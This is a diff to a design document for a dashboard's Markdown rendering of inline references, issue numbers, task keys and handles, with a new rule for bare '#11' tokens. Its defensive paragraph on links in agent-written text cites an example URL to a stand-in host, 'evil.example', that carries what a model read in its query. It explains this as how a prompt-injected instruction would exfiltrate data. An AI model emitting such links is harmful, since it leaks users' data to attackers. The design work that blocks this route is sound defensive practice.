@@ -3812,10 +3812,9 @@ Operator-facing words are full of things a reader has to stop and decode:
 `gophrase/backend#14` is a pull request on GitHub, `#ffe100` is a yellow,
 `~design-review` is a Mattermost channel, `GP-66` is a task. Every surface
 `lib/markdown.ts` renders (a page, a description, a comment, the Inbox, an
-assistant's answer, a transcript) draws what lives outside the company with
-the mark that says what it is, at the text's size and on its line
-(`InlineRef` from `@crewlethq/ui`), and links the company's own things by
-their words alone:
+assistant's answer, a transcript) draws each with the mark that says what it
+is, a little below the text's size and just before its words (`InlineRef`
+from `@crewlethq/ui`), and a seat's handle by its words alone:
 
 | Written | Drawn |
 |---|---|
@@ -3824,8 +3823,9 @@ their words alone:
 | `[label](address)` | Its label as written, after the mark of the app its address belongs to |
 | `owner/repo#14`, `group/project!7`, `owner/repo@b5362d2` | The code host's mark, linked to the company's code host |
 | `owner/repo`, under an owner the company works in | The code host's mark, linked to the repository |
+| `#11`, where its message places it | The code host's mark, linked to the issue or pull request |
 | A SHA after a reference ("at b5362d2") or after the word *commit* | The same, linked to the commit |
-| `GP-66` | Its words, linked to the work item |
+| `GP-66` | The task glyph, linked to the work item |
 | `@miles` | Its words, linked to the seat |
 
 `lib/inlineTokens.ts` holds the recognition rules and the reasons for each.
@@ -3875,13 +3875,32 @@ and links nowhere. The project keys a key needs are the reader's own
 `work_projects`, read once by the frame where Worklet is served to them. No
 mark is ever fetched from anywhere: every mark is the design system's.
 
-**A token is a link only where a link may be.** In a model's words
-(`links: "inert"`) nothing it wrote becomes a link, so a token there is its
-mark and its words. Inside a control or a link (an Inbox row, an answer's
-option, a link's own label) a link would be invalid or steal the press, so
-those draw marks and swatches alone (`renderTokens`). An outbound link a token
-makes opens a tab with `rel="noopener noreferrer"` and says so to a screen
-reader, as every outbound link in rendered Markdown does.
+**A bare `#11` is placed by its message.** `#11` alone is a list's number, a
+rank or an issue in some repository, so it is a reference only where the
+message it is in says which: the same sentence binds it (`#7 in
+gophrase/frontend`, `gophrase/frontend PR #7`, read as one reference); the
+message names that number in full (`gophrase/backend#11`); or the message
+names exactly one repository. Anything else leaves it words. A message is
+one comment, one page or one answer, and an ask's question, context,
+reasoning and options together (`TokenScope`), so the Inbox's "the #11 PR
+body" is placed by the `gophrase/backend` its context names. A number with a
+leading zero, inside a word, a path or an entity, or in code is never one.
+
+**A token is a link only where a link may be.** Inside a control or a link (an
+Inbox row, an answer's option, a link's own label) a link would be invalid or
+steal the press, so those draw marks and swatches alone (`renderTokens`).
+Where the words were written by an agent or a model that may have read
+anything (the assistant's answers and the Inbox, `links: "checked"`), a link
+is live only where the dashboard built it, from parts it checked, to a place
+that is the company's: a key's and a handle's routes, a reference on the
+configured code host, and an address on a configured host rebuilt from what
+it names, with no query or fragment. Any other address there is drawn
+inert, as written and with the host it names, readable and copyable and never
+a control, because `https://evil.example/?q=<what it read>` is how an
+injected instruction would carry words away ([ADR-0061](../../adr/0061-a-read-is-named-in-the-answer-never-drawn-as-a-card.md)).
+An outbound link a token makes opens a tab with `rel="noopener noreferrer"`
+and says so to a screen reader, as every outbound link in rendered Markdown
+does.
 
 **The caller reads first.** The Dashboard Assistant's record chips
 (`RenderOptions.prose`) are drawn before any token is read, and tokens are
